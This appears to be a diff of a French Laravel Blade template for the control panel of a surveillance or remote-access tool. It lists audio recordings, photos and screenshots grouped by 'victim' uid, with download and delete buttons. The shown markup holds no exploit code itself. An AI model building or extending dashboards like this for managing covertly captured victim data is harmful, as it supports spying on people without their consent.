@@ -144,29 +144,66 @@
                             <div class="card">
                                 <div class="card-body">
                                     <h5 class="card-title">Enregistrements</h5>
-                                    <table class="table">
-                                        <thead>
-                                            <tr>
-                                                <th scope="col">ID</th>
-                                                <th scope="col">Nom</th>
-                                                <th scope="col">Heure</th>
-                                                <th scope="col">Date</th>
-                                                <th scope="col">Actions</th>
-                                            </tr>
-                                            </thead>
-                                            <tbody>
-                                            <tr>
-                                                <th scope="row">1</th>
-                                                <td scope="row">20240625-134556.wav</td>
-                                                <td scope="row">13h45</td>
-                                                <td scope="row">25/06/2024</td>
-                                                <td>
-                                                    <button type="submit" class="btn btn-success">Télécharger</button>
-                                                    <button type="submit" class="btn btn-danger">Supprimer</button>
-                                                </td>
-                                            </tr>
-                                        </tbody>
-                                    </table>
+                                                @if ($victims->isEmpty())
+                                                    <div class="alert alert-warning" role="alert">
+                                                        Aucune victime n'est enregistrée.
+                                                    </div>
+                                                @else
+                                                <div class="card">
+                                                    <div class="card-body">
+                                                    <!-- Accordion without outline borders -->
+                                                        <div class="accordion accordion-flush" id="accordionFlushExample">
+                                                            @foreach ($victims as $index => $victim)
+                                                                <div class="accordion-item">
+                                                                    <h2 class="accordion-header" id="flush-heading{{ $index }}">
+                                                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapse{{ $index }}" aria-expanded="false" aria-controls="flush-collapse{{ $index }}">
+                                                                            {{ $victim->uid }}
+                                                                        </button>
+                                                                    </h2>
+                                                                    <div id="flush-collapse{{ $index }}" class="accordion-collapse collapse" aria-labelledby="flush-heading{{ $index }}" data-bs-parent="#accordionFlushExample">
+                                                                        @php
+                                                                        $victimRecords = $records->filter(function($record) use ($victim) {
+                                                                            return $record->victim_id == $victim->id;
+                                                                        });
+                                                                        @endphp
+                                                                        @if ($victimRecords->isEmpty())
+                                                                            <div class="alert alert-warning" role="alert">
+                                                                                Aucun enregistrement.
+                                                                            </div>
+                                                                        @else
+                                                                            <table class="table">
+                                                                                <thead>
+                                                                                    <tr>
+                                                                                        <th scope="col">Id</th>
+                                                                                        <th scope="col">Nom</th>
+                                                                                        <th scope="col">Heure</th>
+                                                                                        <th scope="col">Date</th>
+                                                                                        <th scope="col">Actions</th>
+                                                                                    </tr>
+                                                                                </thead>
+                                                                                <tbody>
+                                                                                    @foreach ($victimRecords as $record)
+                                                                                        <tr>
+                                                                                            <th scope="row">{{ $record->id }}</th>
+                                                                                            <td>{{ $record->result }}</td>
+                                                                                            <td>{{ $record->created_at->format('H:i') }}</td>
+                                                                                            <td>{{ $record->created_at->format('d/m/Y') }}</td>
+                                                                                            <td>
+                                                                                                <button type="submit" class="btn btn-success">Télécharger</button>
+                                                                                                <button type="submit" class="btn btn-danger">Supprimer</button>
+                                                                                            </td>
+                                                                                        </tr>
+                                                                                    @endforeach
+                                                                                </tbody>
+                                                                                </table>
+                                                                        @endif
+                                                            </div>
+                                                        </div>
+                                                    @endforeach
+                                                </div><!-- End Accordion without outline borders -->
+                                            </div>
+                                        </div>
+                                    @endif
                                 </div>
                             </div>
                         </div>
@@ -175,29 +212,66 @@
                             <div class="card">
                                 <div class="card-body">
                                     <h5 class="card-title">Photos</h5>
-                                    <table class="table">
-                                        <thead>
-                                            <tr>
-                                                <th scope="col">ID</th>
-                                                <th scope="col">Nom</th>
-                                                <th scope="col">Heure</th>
-                                                <th scope="col">Date</th>
-                                                <th scope="col">Actions</th>
-                                            </tr>
-                                            </thead>
-                                            <tbody>
-                                            <tr>
-                                                <th scope="row">1</th>
-                                                <td scope="row">20240625-134556.jpg</td>
-                                                <td scope="row">13h45</td>
-                                                <td scope="row">25/06/2024</td>
-                                                <td>
-                                                    <button type="submit" class="btn btn-success">Télécharger</button>
-                                                    <button type="submit" class="btn btn-danger">Supprimer</button>
-                                                </td>
-                                            </tr>
-                                        </tbody>
-                                    </table>
+                                    @if ($pictures->isEmpty())
+                                        <div class="alert alert-warning" role="alert">
+                                            Aucune photo enregistrée.
+                                        </div>
+                                    @else
+                                        <div class="card">
+                                            <div class="card-body">
+                                                <!-- Accordion without outline borders for photos -->
+                                                <div class="accordion accordion-flush" id="accordionFlushPhotos">
+                                                    @foreach ($victims as $index => $victim)
+                                                        <div class="accordion-item">
+                                                            <h2 class="accordion-header" id="flush-heading{{ $index }}-photos">
+                                                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapse{{ $index }}-photos" aria-expanded="false" aria-controls="flush-collapse{{ $index }}-photos">
+                                                                    {{ $victim->uid }}
+                                                                </button>
+                                                            </h2>
+                                                            <div id="flush-collapse{{ $index }}-photos" class="accordion-collapse collapse" aria-labelledby="flush-heading{{ $index }}-photos" data-bs-parent="#accordionFlushPhotos">
+                                                                @php
+                                                                $victimPictures = $pictures->filter(function($picture) use ($victim) {
+                                                                    return $picture->victim_id == $victim->id;
+                                                                });
+                                                                @endphp
+                                                                @if ($victimPictures->isEmpty())
+                                                                    <div class="alert alert-warning" role="alert">
+                                                                        Aucune photo disponible.
+                                                                    </div>
+                                                                @else
+                                                                    <table class="table">
+                                                                        <thead>
+                                                                            <tr>
+                                                                                <th scope="col">Id</th>
+                                                                                <th scope="col">Nom</th>
+                                                                                <th scope="col">Heure</th>
+                                                                                <th scope="col">Date</th>
+                                                                                <th scope="col">Actions</th>
+                                                                            </tr>
+                                                                        </thead>
+                                                                        <tbody>
+                                                                            @foreach ($victimPictures as $picture)
+                                                                                <tr>
+                                                                                    <th scope="row">{{ $picture->id }}</th>
+                                                                                    <td>{{ $picture->result }}</td>
+                                                                                    <td>{{ $picture->created_at->format('H:i') }}</td>
+                                                                                    <td>{{ $picture->created_at->format('d/m/Y') }}</td>
+                                                                                    <td>
+                                                                                        <button type="button" class="btn btn-success">Télécharger</button>
+                                                                                        <button type="button" class="btn btn-danger">Supprimer</button>
+                                                                                    </td>
+                                                                                </tr>
+                                                                            @endforeach
+                                                                        </tbody>
+                                                                    </table>
+                                                                @endif
+                                                            </div>
+                                                        </div>
+                                                    @endforeach
+                                                </div><!-- End Accordion without outline borders -->
+                                            </div>
+                                        </div>
+                                    @endif
                                 </div>
                             </div>
                         </div>
@@ -206,33 +280,70 @@
                             <div class="card">
                                 <div class="card-body">
                                     <h5 class="card-title">Captures</h5>
-                                    <table class="table">
-                                        <thead>
-                                            <tr>
-                                                <th scope="col">ID</th>
-                                                <th scope="col">Nom</th>
-                                                <th scope="col">Heure</th>
-                                                <th scope="col">Date</th>
-                                                <th scope="col">Actions</th>
-                                            </tr>
-                                            </thead>
-                                            <tbody>
-                                            <tr>
-                                                <th scope="row">1</th>
-                                                <td scope="row">20240625-134556.png</td>
-                                                <td scope="row">13h45</td>
-                                                <td scope="row">25/06/2024</td>
-                                                <td>
-                                                    <button type="submit" class="btn btn-success">Télécharger</button>
-                                                    <button type="submit" class="btn btn-danger">Supprimer</button>
-                                                </td>
-                                            </tr>
-                                        </tbody>
-                                    </table>
+                                    @if ($screenshots->isEmpty())
+                                        <div class="alert alert-warning" role="alert">
+                                            Aucune capture d'écran enregistrée.
+                                        </div>
+                                    @else
+                                        <div class="card">
+                                            <div class="card-body">
+                                                <!-- Accordion without outline borders for screenshots -->
+                                                <div class="accordion accordion-flush" id="accordionFlushScreens">
+                                                    @foreach ($victims as $index => $victim)
+                                                        <div class="accordion-item">
+                                                            <h2 class="accordion-header" id="flush-heading{{ $index }}-screen">
+                                                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapse{{ $index }}-screen" aria-expanded="false" aria-controls="flush-collapse{{ $index }}-screen">
+                                                                    {{ $victim->uid }}
+                                                                </button>
+                                                            </h2>
+                                                            <div id="flush-collapse{{ $index }}-screen" class="accordion-collapse collapse" aria-labelledby="flush-heading{{ $index }}-screen" data-bs-parent="#accordionFlushScreens">
+                                                                @php
+                                                                $victimScreenshots = $screenshots->filter(function($screenshot) use ($victim) {
+                                                                    return $screenshot->victim_id == $victim->id;
+                                                                });
+                                                                @endphp
+                                                                @if ($victimScreenshots->isEmpty())
+                                                                    <div class="alert alert-warning" role="alert">
+                                                                        Aucune capture disponible.
+                                                                    </div>
+                                                                @else
+                                                                    <table class="table">
+                                                                        <thead>
+                                                                            <tr>
+                                                                                <th scope="col">Id</th>
+                                                                                <th scope="col">Nom</th>
+                                                                                <th scope="col">Heure</th>
+                                                                                <th scope="col">Date</th>
+                                                                                <th scope="col">Actions</th>
+                                                                            </tr>
+                                                                        </thead>
+                                                                        <tbody>
+                                                                            @foreach ($victimScreenshots as $screenshot)
+                                                                                <tr>
+                                                                                    <th scope="row">{{ $screenshot->id }}</th>
+                                                                                    <td>{{ $screenshot->result }}</td>
+                                                                                    <td>{{ $screenshot->created_at->format('H:i') }}</td>
+                                                                                    <td>{{ $screenshot->created_at->format('d/m/Y') }}</td>
+                                                                                    <td>
+                                                                                        <button type="button" class="btn btn-success">Télécharger</button>
+                                                                                        <button type="button" class="btn btn-danger">Supprimer</button>
+                                                                                    </td>
+                                                                                </tr>
+                                                                            @endforeach
+                                                                        </tbody>
+                                                                    </table>
+                                                                @endif
+                                                            </div>
+                                                        </div>
+                                                    @endforeach
+                                                </div><!-- End Accordion without outline borders -->
+                                            </div>
+                                        </div>
+                                    @endif
                                 </div>
                             </div>
                         </div>
-                        
+
                         <div class="tab-pane fade" id="bordered-justified-scan" role="tabpanel" aria-labelledby="scan-tab">
                             <div class="card">
                                 <div class="card-body">
